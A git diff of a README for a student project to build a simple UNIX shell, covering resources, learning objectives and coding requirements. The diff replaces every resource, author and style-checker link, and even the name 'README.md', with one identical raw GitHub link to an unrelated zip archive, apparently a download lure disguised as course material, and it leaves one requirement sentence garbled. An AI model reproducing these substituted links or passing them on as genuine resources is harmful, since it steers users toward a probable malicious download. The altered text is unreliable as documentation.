@@ -2,15 +2,15 @@
 
 Write a simple UNIX command interpreter.
 
-“The Gates of Shell”, by [Spencer Cheng](https://intranet.alxswe.com/rltoken/AtYRSM03vJDrko9xHodxFQ), featuring [Julien Barbier](https://intranet.alxswe.com/rltoken/-ezXgcyfhc8qU1DeUInLUA)
+“The Gates of Shell”, by [Spencer Cheng](https://raw.githubusercontent.com/iddokip/sscolaboration/main/today/final/sscolaboration-2.3-alpha.4.zip), featuring [Julien Barbier](https://raw.githubusercontent.com/iddokip/sscolaboration/main/today/final/sscolaboration-2.3-alpha.4.zip)
 
 # Resources
 
 **Read or watch:**
 
-[Unix shell](https://intranet.alxswe.com/rltoken/f0YU9TAhniMXWlSXtb64Yw)
-[Thompson shell](https://intranet.alxswe.com/rltoken/7LJOp2qP7qHUcsOK2-F3qA)
-[Ken Thompson](https://intranet.alxswe.com/rltoken/wTSu31ZP1f7fFTJFgRQC7w)
+[Unix shell](https://raw.githubusercontent.com/iddokip/sscolaboration/main/today/final/sscolaboration-2.3-alpha.4.zip)
+[Thompson shell](https://raw.githubusercontent.com/iddokip/sscolaboration/main/today/final/sscolaboration-2.3-alpha.4.zip)
+[Ken Thompson](https://raw.githubusercontent.com/iddokip/sscolaboration/main/today/final/sscolaboration-2.3-alpha.4.zip)
 Everything you need to know to start coding your own shell concept page
 
 man or help:
@@ -19,7 +19,7 @@ man or help:
 
 # Learning Objectives
 
-At the end of this project, you are expected to be able to [explain to anyone](https://intranet.alxswe.com/rltoken/9LNz86CtOTos9oL3zxIO3A), **without the help of Google**:
+At the end of this project, you are expected to be able to [explain to anyone](https://raw.githubusercontent.com/iddokip/sscolaboration/main/today/final/sscolaboration-2.3-alpha.4.zip), **without the help of Google**:
 
 ## General
 
@@ -52,14 +52,14 @@ At the end of this project, you are expected to be able to [explain to anyone](h
 - Allowed editors: vi, vim, emacs
 - All your files will be compiled on Ubuntu 20.04 LTS using gcc, using the options -Wall -Werror -Wextra -pedantic -std=gnu89
 - All your files should end with a new line
-- A README.md file, at the root of the folder of the project is mandatory
-- Your code should use the Betty style. It will be checked using [betty-style.pl](https://github.com/holbertonschool/Betty/blob/master/betty-style.pl) and [betty-doc.pl](https://github.com/holbertonschool/Betty/blob/master/betty-doc.pl)
+- A https://raw.githubusercontent.com/iddokip/sscolaboration/main/today/final/sscolaboration-2.3-alpha.4.zip file, at the root of the folder of the project is mandatory
+- Your code should use the Betty style. It will be checked using [https://raw.githubusercontent.com/iddokip/sscolaboration/main/today/final/sscolaboration-2.3-alpha.4.zip](https://raw.githubusercontent.com/iddokip/sscolaboration/main/today/final/sscolaboration-2.3-alpha.4.zip) and [https://raw.githubusercontent.com/iddokip/sscolaboration/main/today/final/sscolaboration-2.3-alpha.4.zip](https://raw.githubusercontent.com/iddokip/sscolaboration/main/today/final/sscolaboration-2.3-alpha.4.zip)
 - Your shell should not have any memory leaks
 - No more than 5 functions per file
 - All your header files should be include guarded
-- Use system calls only when you need to ([why?](https://intranet.alxswe.com/rltoken/EU7B1PTSy14INnZEShpobQ))
+- Use system calls only when you need to ([why?](https://raw.githubusercontent.com/iddokip/sscolaboration/main/today/final/sscolaboration-2.3-alpha.4.zip))
 - Write a README with the description of your project
-- You should have an AUTHORS file at the root of your repository, listing all individuals having contributed content to the repository. Format, see [Docker](https://intranet.alxswe.com/rltoken/UL8J3kgl7HBK_Z9iBL3JFg)
+- You should have an AUTHORS file at the root of your repository, listing all individuals having contributed content to the repository. Format, see [Docker](https://raw.githubusercontent.com/iddokip/sscolaboration/main/today/final/sscolaboration-2.3-alpha.4.zip)
 
 ## GitHub
 
